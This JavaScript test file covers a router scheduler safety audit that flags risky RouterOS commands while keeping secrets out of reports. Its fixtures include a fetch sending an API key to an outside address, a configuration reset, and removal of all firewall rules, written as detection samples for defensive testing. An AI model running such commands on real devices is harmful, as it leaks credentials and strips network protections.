import test from 'node:test';
import assert from 'node:assert/strict';
import { buildSchedulerSafetyAudit } from '../src/scheduler-safety-audit.js';

const available = (records, extra = {}) => ({ status: 'available', records, ...extra });
const scheduler = (fields = {}) => ({ interval: '1d 00:00:00', 'start-time': 'startup', 'on-event': ':log info "routine task"', disabled: 'no', ...fields });

test('accepts a safe periodic scheduler task without raising a risk', () => {
  const report = buildSchedulerSafetyAudit({ sections: {
    scheduler: available([scheduler()]),
    scripts: available([]),
  } });

  assert.deepEqual(report.findings, []);
  assert.deepEqual(report.counts, { analyzed: 1, findings: 0, unknown: 0, riskCodes: {} });
  assert.equal(report.coverage.sections.scheduler.completeness, 'complete');
});

test('does not report command risks in explicitly disabled scheduler entries', () => {
  const report = buildSchedulerSafetyAudit({ sections: {
    scheduler: available([scheduler({ 'on-event': '/system reboot', disabled: 'yes' })]),
    scripts: available([]),
  } });
  assert.deepEqual(report.findings, []);
  assert.equal(report.counts.findings, 0);
  assert.equal(report.counts.analyzed, 1);
});

test('reports risky source and on-event commands using only indices and risk codes', () => {
  const secret = 'apiKey=SECRET-router-password';
  const address = '198.51.100.77';
  const report = buildSchedulerSafetyAudit({ sections: {
    scheduler: available([
      scheduler({ 'on-event': `/system reboot; /tool fetch url=https://${address}/?${secret}` }),
    ]),
    scripts: available([
      { name: 'private-script-name', source: `/system reset-configuration; /ip firewall filter remove [find]; :log info "${secret}"` },
      { name: 'comment-only', source: `# /system shutdown ${secret}\n:log info "${address}"` },
    ]),
  } });

  assert.deepEqual(report.findings.map(({ section, index, riskCodes }) => ({ section, index, riskCodes })), [
    { section: 'scheduler', index: 0, riskCodes: ['router-reboot', 'remote-fetch'] },
    { section: 'scripts', index: 0, riskCodes: ['configuration-reset', 'configuration-remove'] },
  ]);
  const serialized = JSON.stringify(report);
  for (const forbidden of [secret, address, 'private-script-name', 'comment-only', '/system reboot', 'router-password']) {
    assert.equal(serialized.includes(forbidden), false, `report must not contain ${forbidden}`);
  }
  assert.equal(report.counts.riskCodes['router-reboot'], 1);
  assert.equal(report.counts.riskCodes['remote-fetch'], 1);
  assert.equal(report.counts.riskCodes['configuration-reset'], 1);
});

test('marks missing, unavailable, partial, and unsupported data as unknown', () => {
  const report = buildSchedulerSafetyAudit({ sections: {
    scheduler: available([scheduler()], { partial: true }),
    scripts: { status: 'unavailable-or-not-permitted' },
  } });

  assert.equal(report.coverage.sections.scheduler.completeness, 'unknown');
  assert.equal(report.coverage.sections.scripts.completeness, 'unknown');
  assert.deepEqual(report.findings, []);
  assert.deepEqual(report.unknown.map(({ section, reason }) => [section, reason]), [
    ['scheduler', 'partial-section'],
    ['scripts', 'section-unavailable'],
  ]);

  const missing = buildSchedulerSafetyAudit({ sections: {} });
  assert.deepEqual(missing.unknown.map(({ section, reason }) => [section, reason]), [
    ['scheduler', 'missing-section'],
    ['scripts', 'missing-section'],
  ]);

  const unsupported = buildSchedulerSafetyAudit({ sections: {
    scheduler: available([{ interval: '???', 'start-time': 'startup', 'on-event': 'reboot', disabled: 'no' }]),
    scripts: available([{ name: 'secret-name', source: 42 }]),
  } });
  assert.deepEqual(unsupported.unknown.map(({ section, index, reason }) => [section, index, reason]), [
    ['scheduler', 0, 'unsupported-interval'],
    ['scripts', 0, 'unsupported-source'],
  ]);

  const unsupportedTime = buildSchedulerSafetyAudit({ sections: {
    scheduler: available([scheduler({ 'start-time': 'not-a-time' })]),
    scripts: available([]),
  } });
  assert.deepEqual(unsupportedTime.unknown[0], { section: 'scheduler', index: 0, reason: 'unsupported-start-time' });

  const missingDisabledState = buildSchedulerSafetyAudit({ sections: {
    scheduler: available([{ interval: '1d', 'start-time': 'startup', 'on-event': 'reboot' }]),
    scripts: available([]),
  } });
  assert.deepEqual(missingDisabledState.unknown[0], { section: 'scheduler', index: 0, reason: 'unsupported-disabled-state' });
});

test('enforces record and text bounds without exposing oversized input', () => {
  const hugeSource = 'x'.repeat(16_385);
  const tooMany = Array.from({ length: 5001 }, () => scheduler());
  const report = buildSchedulerSafetyAudit({ sections: {
    scheduler: available(tooMany),
    scripts: available([{ source: hugeSource }]),
  } });

  assert.equal(report.findings.length, 0);
  assert.ok(report.unknown.some(({ section, reason }) => section === 'scheduler' && reason === 'record-limit-exceeded'));
  assert.ok(report.unknown.some(({ section, index, reason }) => section === 'scripts' && index === 0 && reason === 'unsupported-source'));
  assert.equal(JSON.stringify(report).includes(hugeSource), false);
});

test('identifies one-shot schedules and script execution as advisory risks', () => {
  const report = buildSchedulerSafetyAudit({ sections: {
    scheduler: available([scheduler({ interval: '' })]),
    scripts: available([{ source: '/system script run maintenance' }]),
  } });
  assert.deepEqual(report.findings.map(({ riskCodes }) => riskCodes), [
    ['one-shot-schedule'],
    ['script-execution'],
  ]);
});
